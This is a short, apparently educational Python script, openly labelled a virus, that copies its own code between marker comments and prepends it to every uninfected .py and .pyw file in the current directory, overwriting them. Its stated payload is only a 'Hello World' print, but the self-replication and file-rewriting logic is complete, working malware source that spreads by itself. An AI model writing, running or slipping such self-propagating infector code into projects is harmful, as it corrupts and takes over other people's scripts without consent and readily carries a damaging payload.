# Beginning of Virus


#Libraries Needed
import sys, glob

#Code of current file
code = []
with open(sys.argv[0], "r") as f: #Dynamically determines the file name the script is currently in & opens it in reading mode
    lines = f.readlines() #Saves all the lines of code read as lines

#Determines when the code is in the "virus area" to prevent copying all the code in the current script/file, but rather only copy the virus part of the code
virus_area = False #Assumes the code is currently not in the virus area
for line in lines:
    #If the current line is the statement, the "virus area" has been entered
    if line == "# Beginning of Virus\n":
        virus_area = True
    if virus_area: #
        code.append(line) #Keeps the line containing the previous statement when moving forward
    #If the current line is the statement, break out of the loop (End of Virus Area)
    if line == "#End of Virus\n":
        break


#Finds all files in the directory ending in .py & .pyw
python_scripts = glob.glob("*.py") + glob.glob("*.pyw")


#print(python_scripts) #todo Comment out the rest of the code below & uncomment this line to see if the "virus" is capable of finding files ending in .py & .pyw


#Checks the current script/file the code is in to determine if the file is infected or not infected by the virus
for script in python_scripts:
    with open(script, "r") as f: #Opens current file in read mode
        script_code = f.readlines() #Reads the lines in the current file

    infected = False #Assumes File doesn't have the virus
    for line in script_code:
        if line == "# Beginning of Virus\n": #Searches File for a line containing the statement
            #Detects the statement from the virus & stops the code from going further
            infected = True
            break

    if not infected: #If the File doesn't have the virus
        final_code = []
        final_code.extend(code) #Attaches the code for the virus to the file
        final_code.extend("\n")
        final_code.extend(script_code) #Attaches the code that was originally in the file to begin with

        with open(script, "w") as f: #Opens the script found in writing mode
            f.writelines(final_code) #Writes all the code present in this file into the script/file found

#Malicious Piece of Code aka Payload
print("Hello World")



#End of Virus
